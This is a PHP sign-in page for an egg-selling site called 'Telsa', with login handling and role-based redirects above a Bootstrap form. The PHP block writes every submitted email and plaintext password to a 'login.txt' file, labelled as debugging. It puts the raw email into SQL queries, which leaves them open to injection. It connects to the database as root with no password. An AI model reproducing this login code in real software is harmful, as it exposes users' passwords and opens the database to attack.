<?php
session_start(); // Ensure session is started

include("connect.php");
$conn = mysqli_connect("localhost", "root", "", "tracking");
if (!$conn) {
  die("Koneksi gagal: " . mysqli_connect_error());
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  $email = $_POST['email'];
  $password = $_POST['password'];

  // Log posted values for debugging purposes
  file_put_contents('login.txt', "Email: $email, Password: $password\n", FILE_APPEND);

  // Query database to find user with the provided email
  $query = "SELECT * FROM tb_users WHERE email='$email'";
  $result = mysqli_query($conn, $query);

  if ($result && mysqli_num_rows($result) > 0) {
    $user = mysqli_fetch_assoc($result);
    $hashedPassword = $user['password'];  // Get hashed password from the database

    // Compare hashed password with user-submitted password
    if (password_verify($password, $hashedPassword)) {
      // Fetch the username and status from the database
      $query = "SELECT first_name, status FROM tb_users WHERE email='$email'";
      $result = mysqli_query($conn, $query);

      if ($result && mysqli_num_rows($result) > 0) {
        $user = mysqli_fetch_assoc($result);

        // Redirect based on user status
        if ($user['status'] === 'customer') {
          header('Location: homeumum.php');
          exit();
        } elseif ($user['status'] === 'Distributor') {
          header('Location: homedistributor.php');
          exit();
        } elseif ($user['status'] === 'Agen') {
          header('Location: homeagen.php');
          exit();
        } elseif ($user['status'] === 'Peternak') {
          header('Location: admin/dashboard-admin.php');
          exit();
        } else {
          exit(); // For other statuses, handle differently or exit.
        }
      } else {
        exit("No user found for the given email.");
      }
    } else {
      $_SESSION['error'] = "invalid email or password";
            header("Location: signin.php");
            exit();
    }
  } else {
    $_SESSION['error'] = "invalid email or password";
            header("Location: signin.php");
            exit();
  }
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous" />
  <link rel="stylesheet" href="_css/signin.css" />

  <title>Telsa | Signin</title>

  <!--== Fonts ==-->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Pangolin&family=Poppins&family=Potta+One:wght@400;500&display=swap" rel="stylesheet" />

  <!--== Favicon ==-->
  <link rel="shortcut icon" href="image/telsa.png" type="image/x-icon" />
</head>

<body>
  <!-- Hero Section Start -->
  <div class="container">
    <div class="signin">
      <h2>Sign In</h2>

      <form class="form-login col-lg-9 align-item-center" action="signin.php" method="POST">
        <div class="mb-3">
          <label for="email"> Email <span class="color-red">*</span> </label>
          <input type="text" class="email form-control" id="email" name="email" placeholder="Masukan email" required />
        </div>

        <div class="mb-3">
          <label for="password"> Password <span class="color-red">*</span> </label>
          <input type="password" class="password form-control" id="password" name="password" placeholder="Masukan password" required />
        </div>

        <?php if (isset($_SESSION['error'])) : ?>
          <div class="alert alert-danger"><?php echo $_SESSION['error']; ?></div>
          <?php unset($_SESSION['error']); ?>
        <?php endif; ?>
        
        <button type="submit" class="btn">Login</button>
      </form>
      <div class="form-group remember-forgot">
        <div class="remember-me">
          <input type="checkbox" id="remember" name="remember" />
          <label for="remember">Remember Me</label>
        </div>
        <div class="forgot-password">
          <a href="#">Forgot Password?</a>
        </div>
      </div>
    </div>

    <div class="image justify-content-center">
      <div class="img-logo">
        <img src="image/telsa.png" alt="logo" width="380" />
      </div>
      <h1>WELCOME TO <span class="text-color">TELSA</span></h1>
      <h3>Buy high quality eggs here</h3>
      <a href="signup.php"><button type="submit" class="btn2">Signup here</button></a>
    </div>
  </div>

  <!-- Hero Section End -->

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
  <script src="main.js"></script>
</body>

</html>